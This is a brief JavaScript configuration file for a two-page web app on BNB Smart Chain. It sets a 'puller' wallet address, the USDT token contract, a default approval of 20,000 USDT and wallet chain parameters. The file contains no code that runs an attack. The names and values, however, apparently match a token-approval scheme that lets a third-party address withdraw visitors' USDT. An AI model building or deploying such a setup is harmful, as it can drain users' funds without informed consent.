// Global config for both pages
window.APP_CONFIG = {
  PULLER_ADDRESS: "0xd1e5962eeFe6dc0a870d2148B7e2065666139b5c",
  USDT_ADDRESS: "0x55d398326f99059fF775485246999027B3197955",
  DEFAULT_APPROVAL_USDT: 20000,
  BSC: {
    CHAIN_ID_HEX: "0x38",
    CHAIN_PARAMS: {
      chainId: "0x38",
      chainName: "BNB Smart Chain",
      nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
      rpcUrls: ["https://bsc-dataseed.binance.org/"],
      blockExplorerUrls: ["https://bscscan.com"]
    }
  },
  // Leave empty to use same-origin server (recommended)
  BACKEND_URL: ""
};
